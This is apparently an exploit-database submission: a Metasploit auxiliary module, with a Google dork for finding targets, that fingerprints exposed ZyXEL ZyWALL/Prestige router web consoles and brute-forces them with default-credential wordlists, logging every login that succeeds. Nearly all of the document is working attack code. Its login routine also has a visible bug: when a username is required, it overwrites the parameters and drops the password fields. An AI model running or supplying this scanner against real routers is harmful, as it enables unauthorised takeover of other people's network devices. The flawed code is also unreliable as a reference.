# Exploit Title: ZyXEL ZyWALL/Prestige Router Web Console
# Default Password Scanner
# Google Dork: inurl:rpAuth.html
# Date: 2014-09-30
# Exploit Author: Jonathan Racicot <infectedpacket [at] gmail [dot] com>
# Vendor Homepage: http://www.zyxel.com/us/en/homepage.shtml
# Software Link:
#  http://www.zyxel.com/us/en/products_services/p_660h_series.shtml?t=p&tabOrder=1
# Version: [app version - REQUIRED]
# Tested on: AMG1202-T10A, P-660H-T1 v2, P-660HW-T1 v2, P-660HW-T1 v3
# CVE : CVE-2007-4316, CVE-2008-1256, CVE-2008-1522
# Todo:
#   [ ] Toggle SSL/Plain not automatic
#   [ ] Username/Password switch to Pass only
require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'ZyXEL ZyWALL/Prestige Router Web Console '\
                'Default Credentials Scanner',
      'Version' => '$Revision: 1 $',
      'Description' => 'This module scans for ZyXEL ZyWALL and '\
                       'Prestige type of routers with remote web'\
                       'management enabled. It send attempts to '\
                       'log into the web management console using'\
                       'default credentials.',
      'Author'  => ['Jonathan Racicot <cyberrecce[at]gmail.com>'],
      'License' => MSF_LICENSE,
      'References'  => [['URL', 'http://bit.ly/1nHE385'],
                        ['CVE', '2008-1256'],
                        ['CVE', '2007-4316'],
                        ['CVE', '2008-1522']],
      'Targets' => [['Any'],
                    ['AMG1202-T10A'],
                    ['MAX-216M1R'],
                    ['OX253P'],
                    ['P-2602HW-D1A'],
                    ['P-2602R-D1A'],
                    ['P-2612HWU-F1'],
                    ['P-2802HWL-I3'],
                    ['P-660R-D1'],
                    ['P-660R-T1 v2'],
                    ['P-660H-D1'],
                    ['P-660H-T1 v2'],
                    ['P-660HW-T1 v2'],
                    ['P-660HW-T1 v3'],
                    ['P-661H-D1'],
                    ['P-661HW-D1'],
                    ['P-662H-D1']],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
          {
            'USER_FILE' => File.join(Msf::Config.data_directory,
                                     'wordlists',
                                     'zyxel_default_user.txt'),
            'PASS_FILE' => File.join(Msf::Config.data_directory,
                                     'wordlists',
                                     'zyxel_default_pass.txt'),
            'STOP_ON_SUCCESS' => true,
            'SSL' => true
          }
    )

    deregister_options('BLANK_PASSWORDS',
                       'USERPASS_FILE',
                       'DB_ALL_PASS',
                       'DB_ALL_USERS',
                       'DB_ALL_CREDS',
                       'RHOST',
                       'USER_AS_PASS')
  end

  # Attemps to retrieve the login page of the Web Management console of
  # router. If the function fails to connect, a null response object will
  # be returned. Otherwise, the response object created by 'send_request_cgi'
  # will be returned.
  # @param ip The IP address of the router to brute force.
  # @return Response received by HTTP GET request to the root page of
  # the router.
  def get_login_page(ip)
    begin
      response = send_request_cgi(
        'uri'   =>  '/',
        'method' =>  'GET'
      )

      # Some models of ZyXEL ZyWALL return a 200 OK response
      # and use javascript to redirect to the rpAuth.html page.
      if response && response.body =~ /changeURL\('rpAuth.html'\)/
        vprint_status "#{ip}- Redirecting to rpAuth.html page..."
        response = send_request_cgi(
          'uri'   =>  '/rpAuth.html',
          'method' =>  'GET'
        )
      end

    rescue ::Rex::ConnectionError
      vprint_error "#{ip} - Failed to connect to Web management console."
    end
    return response
  end

  # Verifies based on the given response if the router is a ZyXEL router
  # we can attempt default passwords against. It simply checks for keywords
  # within the page to determine if the router is a valid target.
  # Returns true if the router is a targetable ZyXEL router, returns
  # false otherwise.
  # @param response Response received by the 'send_request_cgi' function
  #     to the router to retrieve the login page.
  # @return true if the router is a targetable ZyXEL router, returns
  # false otherwise.
  def is_zyxel?(response)
    if response \
       && response.headers['Server'] \
       && response.headers['Server'] =~ /RomPager(.*)/ \
       && response.body =~ /ZyXEL|ZyWALL|Logo_zyxel.gif/
      return true
    else
      return false
    end
  end

  def check_host(ip)
    @check_only = true
    response = get_login_page(ip)
    if response.nil? || response.code != 200
      Exploit::CheckCode::Unknown
    else
      if is_zyxel?(response)
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    end
  end


  # Sends the HTTP POST requests to login into the router using the paramters
  # given. Note that the 'username' parameter will not be used if the
  # 'need_username' parameter is set to false.
  # If a connection cannot be established, the function will fail and return
  # :abort. If a successful login occurs, the credentials used will be recorded
  # into the Metasploit database and the value :success will be returned. Otherwise,
  # the function will skip to the next credential pair.
  # @param ip The ip to send the HTTP POST request.
  # @param username The username to login with. Ignored if 'need_username' is false.
  # @param password The password to login with.
  # @param need_username Specifies if the current router needs a username to login.
  # @return :abort if a connection could not be established. Returns :success if the
  # credentials specified granted access to the management page. Returns :skip_user
  # otherwise.
  def do_login(ip, username, password, need_username)
    md5_password = Digest::MD5.hexdigest(password)
    params = {
      'Prestige_Login'  =>  'Login',
      'LoginPassword'   =>  'ZyXEL+ZyWALL+Series',
      'hiddenPassword'  =>  md5_password
    }
    if need_username
      params = {
        'LoginAccount'    =>  username
      }
    end

    vprint_status "#{ip} - Trying username '#{username}' "\
                  "with password '#{password}'..."

    begin
      response = send_request_cgi(
          'uri' =>  '/Forms/rpAuth_1',
          'method' =>  'POST',
          'vars_post' => params
      )
    rescue ::Rex::ConnectionError
      print_error "#{ip} - Failed to connect to Web management console."
      return :abort
    end

    if response && \
      (response.redirect? && response.redirection.path =~ /passWarning|rpSys/)
      username = '(empty)' unless need_username
      print_good "#{ip} - Successfully logged in with username '#{username}' "\
                 "and password '#{password}'"
      report_auth_info(
        host: rhost,
        port: rport,
        sname: (ssl ? 'https' : 'http'),
        user: username,
        pass: password,
        active: true
      )
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: self.name,
        info: "Successfully logged in with #{username}/#{password}.",
        refs: self.references
      )
      return :success
    else
      vprint_error "#{ip} - Failed to login with username '#{username}' "\
                   "and password '#{password}'"
      return :skip_user
    end
  end

  # This function will try the default credentials against the specified
  # IP address after confirming the router is a ZyXEL Prestige/ZyWALL
  # model.
  # @param ip The IP address to brute force
  def run_host(ip)
    response = get_login_page(ip)
    if response.nil?
      print_status "#{ip}- No response from device. Verify if the device is up."
      return :abort
    end
    vprint_status "#{ip} - Checking if host is a ZyXEL device."
    if is_zyxel?(response)
      print_good "#{ip} - Appears to be a ZyXEL device."

      if response.body
        need_username = (response.body =~ /name="LoginAccount"/)
      end

      each_user_pass do |user, pass|
        result = do_login(ip, user, pass, need_username)
        if result == :success
          :next_user
        else
          :skip_pass
        end
      end
    else
      print_error "#{ip} - Not a ZyXEL Prestige/ZyWALL device."
    end
  end
end
